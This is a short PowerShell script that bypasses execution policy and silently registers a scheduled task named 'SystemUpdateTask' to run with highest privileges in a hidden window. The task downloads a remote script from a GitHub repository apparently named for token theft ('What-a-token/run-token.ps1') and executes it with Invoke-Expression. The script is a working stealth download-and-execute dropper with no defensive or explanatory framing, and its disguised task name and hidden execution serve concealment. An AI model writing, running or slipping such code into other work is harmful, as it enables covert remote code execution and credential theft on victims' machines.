<#
.SYNOPSIS
Silently creates a scheduled task for one-time admin execution of a remote script.
#>

# Silent execution parameters
$execPolicy = Get-ExecutionPolicy
if ($execPolicy -gt "RemoteSigned") {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
}

# Configuration - adjust these as needed
$taskName = "SystemUpdateTask-$(Get-Date -Format 'yyyyMMdd')"
$startTime = (Get-Date).AddMinutes(2)  # Runs 2 minutes from now
$command = "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AFRAID-FOR-YOU/What-a-token/refs/heads/main/run-token.ps1' -UseBasicParsing).Content"

# Create the scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$command`""
$trigger = New-ScheduledTaskTrigger -Once -At $startTime
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null

# Optional: Unblock the original script file if it exists locally
if (Test-Path $MyInvocation.MyCommand.Path) {
    Unblock-File -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
}

# Silent completion
exit 0
